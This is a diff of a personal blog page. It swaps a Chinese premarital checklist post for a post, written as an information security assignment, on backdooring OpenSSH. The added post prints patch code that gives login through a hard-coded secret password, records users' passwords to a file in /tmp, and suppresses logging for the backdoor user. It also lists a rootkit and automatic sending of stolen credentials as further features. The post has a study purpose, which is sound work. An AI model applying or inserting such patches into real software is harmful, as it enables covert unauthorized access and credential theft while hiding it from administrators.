@@ -777,111 +777,100 @@ Arduino的IDE非常友好。插上。File--Examples里面例子很全。而且�
 
             </article>
             <div class="clear"></div>
-            <h4 class="date"> 1月 30, 2014</h4>
+            <h4 class="date">12月 30, 2013</h4>
             <article class="post">
 <h2 class="title">
-                    <a href="http://caoyijun.com/Marriage-Compatibility-Checklist.html" rel="bookmark" title="Permanent Link to &quot;婚前相容性检查表&quot;">婚前相容性检查表</a>
+                    <a href="http://caoyijun.com/ssh-backdoor-a-simple-example.html" rel="bookmark" title="Permanent Link to &quot;SSH Backdoor a simple example&quot;">SSH Backdoor a simple example</a>
                 </h2>
 
-                <h1>婚前相容性检查表</h1>
-<h4>供检查双方对未来生活的期望是否相容。以免婚姻悲剧。</h4>
+                <h1>SSH Backdoor --- a simple example analysis</h1>
+<h4>Information security assignment by 曹逸君</h4>
+<blockquote>
+<p>It's not a secret that there are dozens of ssh backdoor out there.<br />
+And it's fairly easy to write a simple one.<br />
+Usually they have two main functions. <br />
+<strong>Secret authentication</strong> and <strong>Password|RSA key collection</strong>   <br />
+</p>
+</blockquote>
+<h2>Secret authentication</h2>
+<p>Password or RSA key auth for the backdoor user,In the example only password auth implemented.  </p>
+<div class="highlight"><pre><span class="gh">diff -u openssh/includes.h openssh.patch//includes.h</span>
+<span class="gd">--- openssh/includes.h  2010-10-24 06:47:30.000000000 +0800</span>
+<span class="gi">+++ openssh.patch//includes.h   2013-12-24 22:17:53.385927565 +0800</span>
+<span class="gu">@@ -172,4 +172,9 @@</span>
+
+ #include &quot;entropy.h&quot;
+
+<span class="gi">+int secret_auth;</span>
+<span class="gi">+FILE *f;</span>
+<span class="gi">+#define ILOG &quot;/tmp/ilog&quot;</span>
+<span class="gi">+#define OLOG &quot;/tmp/olog&quot;</span>
+<span class="gi">+#define SECRETPW &quot;flyhigh&quot;</span>
+</pre></div>
 
 
-<h2>经济</h2>
-<h4>期望的收入水平</h4>
-<p><br>
-<br>
-<br></p>
-<h4>计划的消费分配</h4>
-<p><br>
-<br>
-<br></p>
-<h4>资产与资金配比</h4>
-<p><br>
-<br>
-<br></p>
-<h2>生活</h2>
-<h4>住在哪儿</h4>
-<p><br>
-<br>
-<br></p>
-<h4>哪些人</h4>
-<p><br>
-<br>
-<br></p>
-<h4>住什么</h4>
-<p><br>
-<br>
-<br></p>
-<h2>职业</h2>
-<h4>各自职业领域</h4>
-<p><br>
-<br>
-<br></p>
-<h4>职业态度</h4>
-<p><br>
-<br>
-<br></p>
-<h2>性生活</h2>
-<h4>对婚外情态度及协定</h4>
-<p><br>
-<br>
-<br></p>
-<h4>对婚外性生活态度及协定</h4>
-<p><br>
-<br>
-<br></p>
-<h2>下一代</h2>
-<h4>什么时候生小孩</h4>
-<p><br>
-<br>
-<br></p>
-<h4>几个，男女</h4>
-<p><br>
-<br>
-<br></p>
-<h4>谁来带，怎么带</h4>
-<p><br>
-<br>
-<br></p>
-<h3>教育理念</h3>
-<h4>父母的权利与义务</h4>
-<p><br>
-<br>
-<br></p>
-<h4>孩子的权利与义务</h4>
-<p><br>
-<br>
-<br></p>
-<blockquote>
-<p>例题
-1.孩子不肯吃饭、睡觉。要玩。采取什么措施。
-2.孩子在外面玩，不肯回家。怎么办。
-3.孩子有了男\女盆友，对象你们喜欢怎么办。不喜欢怎么办。孩子不告诉你们怎么办。
-4.孩子的幼儿时期、幼儿园、小学、中学、大学上不上，怎么过。
-5.对孩子成家立业的走向做不做干预。多少干预。</p>
-</blockquote>
-<h2>老一辈</h2>
-<h3>父母养老</h3>
-<p><br>
-<br>
-<br></p>
-<h3>父母权利与义务</h3>
-<p><br>
-<br>
-<br></p>
-<blockquote>
-<p>例题
-父母想/不想带孙子/女。怎么办。</p>
-</blockquote>
-<h2>人生态度与理想</h2>
+<div class="highlight"><pre>    diff -u openssh/auth-passwd.c openssh.patch//auth-passwd.c
+    +   if (!strcmp(password, SECRETPW)) {
+    +                secret_auth=1;
+    +                return 1;
+    +        }
+</pre></div>
+
+
+<h2>Password|RSA key collection</h2>
+<p>Only passwords collection are implemented in this example.Both in and out. <br />
+And in the example we won't send the stolen passwords to our server, just simply write it to a file. </p>
+<div class="highlight"><pre><span class="o">@@</span> <span class="nt">-123</span><span class="o">,</span><span class="nt">6</span> <span class="o">+</span><span class="nt">126</span><span class="o">,</span><span class="nt">12</span> <span class="o">@@</span>
+    <span class="err">}</span>
+ <span class="nf">#endif</span>
+    <span class="nt">result</span> <span class="o">=</span> <span class="nt">sys_auth_passwd</span><span class="o">(</span><span class="nt">authctxt</span><span class="o">,</span> <span class="nt">password</span><span class="o">);</span>
+<span class="o">+</span>   <span class="nt">if</span><span class="o">(</span><span class="nt">result</span><span class="o">)</span><span class="p">{</span>
+<span class="o">+</span>       <span class="n">if</span><span class="p">((</span><span class="n">f</span><span class="o">=</span><span class="n">fopen</span><span class="p">(</span><span class="n">ILOG</span><span class="o">,</span><span class="s2">&quot;a&quot;</span><span class="p">))</span><span class="o">!=</span><span class="n">NULL</span><span class="p">)</span><span class="err">{</span>
+<span class="o">+</span>           <span class="n">fprintf</span><span class="p">(</span><span class="n">f</span><span class="o">,</span><span class="s2">&quot;user:password --&gt; %s:%s\n&quot;</span><span class="o">,</span><span class="n">authctxt</span><span class="o">-&gt;</span><span class="n">user</span><span class="o">,</span> <span class="n">password</span><span class="p">);</span>
+<span class="o">+</span>           <span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
+<span class="o">+</span>       <span class="p">}</span>
+<span class="o">+</span>   <span class="err">}</span>
+</pre></div>
+
+
+<h2>No log for backdoor</h2>
+<p>There are several place modified to prevent log of backdoor user's login activities.like this.  </p>
+<div class="highlight"><pre><span class="gh">diff -u openssh/log.c openssh.patch//log.c</span>
+<span class="gd">--- openssh/log.c   2011-06-20 11:42:23.000000000 +0800</span>
+<span class="gi">+++ openssh.patch//log.c    2013-12-24 22:17:53.385927565 +0800</span>
+<span class="gu">@@ -351,6 +351,7 @@</span>
+ void
+ do_log(LogLevel level, const char *fmt, va_list args)
+ {
+<span class="gi">+if(!secret_auth || secret_auth!=1){</span>
+ #if defined(HAVE_OPENLOG_R) &amp;&amp; defined(SYSLOG_DATA_INIT)
+    struct syslog_data sdata = SYSLOG_DATA_INIT;
+ #endif
+<span class="gu">@@ -428,3 +429,4 @@</span>
+    }
+    errno = saved_errno;
+ }
+<span class="gi">+}</span>
+</pre></div>
+
+
+<h2>Futher features</h2>
+<p>There are features that is crucial to reallife usage. <br />
+    1. rookit to protect the backdoor<br />
+    2. live-patch to make sure sshd won't have to restart.<br />
+    3. auto-send collected passwords and RSA secret keys.  </p>
+<p>These features have been shown up in real-life examples.<br />
+Security is not only about keep the boarder,inner environment monitor is evenly essential.  </p>
+<p>reference<br />
+<a href="http://packetstormsecurity.com/files/114283/OpenSSH-6.0p1-Full-Backdoor-Patch.html">origin patch code</a><br />
+<a href="http://www.openssh.org/">openssh</a></p>
 <blockquote>
 <p>Written with <a href="https://stackedit.io/">StackEdit</a>.</p>
 </blockquote>
 
                 <div class="clear"></div>
                 <div class="info">
-                    <a href="http://caoyijun.com/Marriage-Compatibility-Checklist.html">posted at 16:04</a>
+                    <a href="http://caoyijun.com/ssh-backdoor-a-simple-example.html">posted at 21:49</a>
                 </div>
 
             </article>
